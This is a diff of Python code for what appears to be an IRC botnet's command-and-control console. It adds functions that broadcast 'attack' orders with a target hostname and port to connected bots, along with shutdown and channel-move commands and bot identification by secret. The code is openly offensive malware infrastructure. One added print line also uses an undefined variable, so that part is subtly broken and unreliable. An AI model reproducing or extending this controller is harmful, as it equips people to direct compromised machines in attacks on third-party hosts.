@@ -40,7 +40,7 @@ class PyBotCon:
 
 #    self.ircsock.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
     self.joinChan()
-#    self.identifyBots() # This should not be run when conbot connects, as it waits for at least one bot
+    self.identifyBots() 
     self.conMain()
 #    self.listen()
 
@@ -50,11 +50,6 @@ class PyBotCon:
 
   def joinChan(self):
     self.ircsock.send(bytes("JOIN "+self.channel+"\n", "UTF-8"))
-#    return
-#    msg=""
-#    while msg.find("End of /NAMES list.") == -1:
-#      msg = self.ircsock.recv(2048).decode("UTF-8")
-#      msg = msg.strip("\n\r")
 
   def conMain(self):
     while(True):
@@ -80,6 +75,8 @@ class PyBotCon:
         self.identifyBots()
         print(str(len(self.botList))+" bots found: " + str(self.botList))
       elif(command.startswith("attack")):
+        atkCommand = command.split()
+        self.attackOrder(atkCommand[1],atkCommand[2])
         # NOTE --> Need to create a function for sending the attack command
         print("Call attack function here")
       elif(command.startswith("move")):
@@ -90,11 +87,16 @@ class PyBotCon:
         # NOTE --> Might need to actually disconnect form the IRC server before exiting the program, will have to look into this
         sys.exit("Command Bot Disconnected")
       elif(command=="shutdown"):
-        sys.exit("Not Implemented")
-        # Need to create a function for sending shutdown message to the channel
+        self.shutdownCommand()
+
+  def attackOrder(self, hostname, port):
+    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :attack " + hostname + " " + port + "\n\r","UTF-8"))
 
   def ping(self):
     self.ircsock.send(bytes("PONG :pingis\n","UTF-8"))
+
+  def shutdownCommand(self):
+    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :shutdown\n\r","UTF-8"))
 
   def listen(self):
     while True:
@@ -122,19 +124,18 @@ class PyBotCon:
       self.control = 1
 
   def changeChannel(self,channel,newServer, newPort, newChannel):
-    self.ircsock.send(bytes("PRIVMSG" + channel + " " + "move " + newServer + " " + newPort + " " + newChannel + "\n","UTF-8"))  
+    self.ircsock.send(bytes("PRIVMSG " + channel + " :" + "move " + newServer + " " + newPort + " " + newChannel + "\n","UTF-8"))
+    print(str(len(self.botList)) + " bots have moved to: " + newserver + "/" + newPort + " #" + newChannel + "\n")
 
   def identifyBots(self):
-    # Send 'hello' message for bots to identify themselves
-    self.ircsock.send(bytes("PRIVMSG " + self.channel + " " + self.secret + "\n","UTF-8")) 
+    # Send 'secret' message for bots to identify themselves
+    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :" + self.secret + "\n","UTF-8")) 
     self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
-#    self.ircsock.setblocking(0)
-#    time.sleep(5)
+    time.sleep(2)
     period = timedelta(seconds=5) 
     endLoop = datetime.now() + period
 #    print("DEBUG --> readable socket list: " + str(read))
     while datetime.now() < endLoop:
-# NOTE --> I'm not sure how I should be listening for bot replies, this will need to be adjusted
       read, _, _ = select.select([self.ircsock],[],[],5)
       if self.ircsock in read:
         data = self.ircsock.recv(2048).decode("UTF-8")
